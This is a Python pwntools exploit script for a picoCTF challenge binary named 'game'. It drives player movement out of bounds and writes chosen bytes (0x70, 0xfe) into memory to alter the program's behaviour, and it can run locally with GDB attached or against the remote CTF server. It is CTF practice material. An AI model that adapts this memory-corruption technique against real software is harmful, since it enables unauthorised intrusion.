from pwn import *

# Exploit configs
binary = ELF('game')
host = 'rhea.picoctf.net'
port = 52305
#local_libc = ELF('./libc-x.xx.so', checksec=False)
#remote_libc = ELF('./libc6_2.36.so', checksec=False)
#ld = ELF('./ld-x.xx.so', checksec=False)

#call GDB
##############################################################################################
def launch_gdb(breakpoints=[], cmds=[]):
    if args.GDB:
        info("Attaching Debugger")
        cmds.append('handle SIGALRM ignore')
        cmds.append('set follow-fork-mode parent')
        for b in breakpoints:
            cmds.insert(0,'b *' + str(binary.address + b))
        gdb.attach(io, gdbscript='\n'.join(cmds))
    else:
        return
##############################################################################################

def move_left(n):
    for i in range(n):
        io.send(b'a')

def move_right(n):
    for i in range(n):
        io.send(b'd')

def move_up(n):
    for i in range(n):
        io.send(b'w')

def move_down(n):
    for i in range(n):
        io.send(b's')

def move_goal():
    io.send(b'p')

if __name__ == '__main__':
    # call with DEBUG to change log level
    # call with GDB to attach gdb
    # call with REMOTE to run against live target
    if args.REMOTE:
        args.GDB = False # disable gdb when working remote
        io = remote(host, port)
#        libc = remote_libc
    else:
#        io = process(binary.path, env={'LD_PRELOAD': remote_libc.path})
        io = process(binary.path)
#        libc = remote_libc
    if not args.REMOTE:
        for mmap in open('/proc/{}/maps'.format(io.pid),"rb").readlines():
            mmap = mmap.decode()
            if binary.path.split('/')[-1] == mmap.split('/')[-1][:-1]:
                binary.address = int(mmap.split('-')[0],16)
                break
    c = [
    'info registers',
    ]
    #b = [0x8049905 - 0x8048000]
    b = [0x804958c - 0x8048000]
    
    #level1
    move_left(8)
    move_up(4)
    move_down(4)
    move_goal()

    #level2
    move_left(8)
    move_up(4)
    move_down(4)
    move_goal()

    #level3
    move_left(8)
    move_up(4)
    move_down(4)
    move_goal()

    #level4
    move_left(8)
    move_up(4)
    move_down(4)
    move_left(7 + 36 + 4)
    move_up(3)
    io.send(b'l')
    io.send(b'\x70')
    move_up(1)

    #level5
    move_left(8)
    move_up(4)
    move_down(4)
    move_left(7 + 36 + 4 + 16)
    move_up(3)
    io.send(b'l')
    io.send(b'\xfe')
    launch_gdb(breakpoints=b)
    move_up(1)
    io.interactive()
#    
#    move_goal()
#
#    io.interactive()